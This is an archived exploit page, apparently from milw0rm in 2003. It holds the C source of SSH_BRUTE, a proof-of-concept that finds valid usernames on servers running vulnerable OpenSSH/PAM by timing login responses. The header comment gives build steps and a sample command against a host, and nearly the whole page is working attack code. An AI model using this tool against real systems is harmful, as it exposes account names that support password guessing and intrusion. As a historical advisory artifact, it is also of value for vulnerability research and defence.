<html><head><title>OpenSSH/PAM <= 3.6.1p1 Remote Users Discovery Tool
</title></head><pre>/*
* SSH_BRUTE - OpenSSH/PAM &lt;= 3.6.1p1 remote users discovery tool
* Copyright (c) 2003 @ Mediaservice.net Srl. All rights reserved
*
*
* Vulnerability discovered by Marco Ivaldi &lt;raptor@mediaservice.net&gt;
* Proof of concept code by Maurizio Agazzini &lt;inode@mediaservice.net&gt;
*
* Tested against Red Hat, Mandrake, and Debian GNU/Linux.
*
* Reference: http://lab.mediaservice.net/advisory/2003-01-openssh.txt
*
* $ tar xvfz openssh-3.6.1p1.tar.gz
* $ patch -p0 &lt;openssh-3.6.1p1_brute.diff 
* patching file openssh-3.6.1p1/ssh.c
* patching file openssh-3.6.1p1/sshconnect.c
* patching file openssh-3.6.1p1/sshconnect1.c
* patching file openssh-3.6.1p1/sshconnect2.c
* $ cd openssh-3.6.1p1
* $ ./configure
* $ make
* $ cc ../ssh_brute.c -o ssh_brute
* $ ./ssh_brute 1 list.txt 192.168.0.66
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/wait.h&gt;

/* an illegal user */
#define NO_USER &quot;not_val_user&quot;

/* path of the patched ssh */
#define PATH_SSH &quot;./ssh&quot;

/* max time range for invalid user */
#define TIME_RANGE 3 

int main(int argc, char *argv[])
{
FILE * in;
char buffer[2000], username[100], *host;
int time_non_valid = 0, time_user = 0; 
int version = 1, i = 0, ret;

fprintf(stderr, &quot;\n SSH_BRUTE - OpenSSH/PAM &lt;= 3.6.1p1 remote users discovery tool\n&quot;);
fprintf(stderr, &quot; Copyright (c) 2003 @ Mediaservice.net Srl. All rights reserved\n&quot;); 

if (argc &lt; 3) {
fprintf(stderr, &quot;\n Usage: %s &lt;protocol version&gt; &lt;user file&gt; &lt;host&gt;\n\n&quot;, argv[0]);
exit(-1);
}

version = atoi(argv[1]);
host = argv[3];

if ( ( in = fopen(argv[2], &quot;r&quot;) ) == NULL ) {
fprintf(stderr, &quot;\n Can't open %s\n&quot;, argv[2]);
exit(-1);
}

/* test an illegal user */
printf(&quot;\n Testing an illegal user\t: &quot;);
fflush(stdout);

sprintf(buffer, &quot;%s -%d %s@%s&quot;, PATH_SSH, version, NO_USER, host);

for (i = 0; i &lt; 3; i++) {
ret = system(buffer);
time_non_valid += WEXITSTATUS(ret);
}

time_non_valid /= 3;

printf(&quot;%d second(s)\n\n&quot;, time_non_valid);

time_non_valid += TIME_RANGE;

/* test supplied users */
fscanf(in, &quot;%s&quot;, username);

while ( !feof(in) ) {

printf(&quot; Testing login %s\t&quot;, username);

if (strlen(username) &lt;= 8)
printf(&quot;\t&quot;);
printf(&quot;: &quot;);

fflush( stdout );

sprintf(buffer, &quot;%s -%d %s@%s&quot;, PATH_SSH, version, username, host);
ret = system(buffer);
time_user = WEXITSTATUS(ret);

if (time_user &lt;= time_non_valid) 
printf(&quot;\E[31m\E[1mILLEGAL\E[m\t[%d second(s)]\n&quot;, time_user);
else {
/* valid user? test it again to be sure */

ret = system(buffer);
time_user = WEXITSTATUS(ret);

if (time_user &lt;= time_non_valid)
printf(&quot;\E[31m\E[1mILLEGAL\E[m\t[%d second(s)] [2 test]\n&quot;, time_user);
else
printf(&quot;\E[32m\E[1mUSER OK\E[m\t[%d second(s)]\n&quot;, time_user);
}

fscanf(in, &quot;%s&quot;, username);
}

fclose(in);

printf(&quot;\n&quot;);

exit(0);
}



// milw0rm.com [2003-04-30]</pre></html>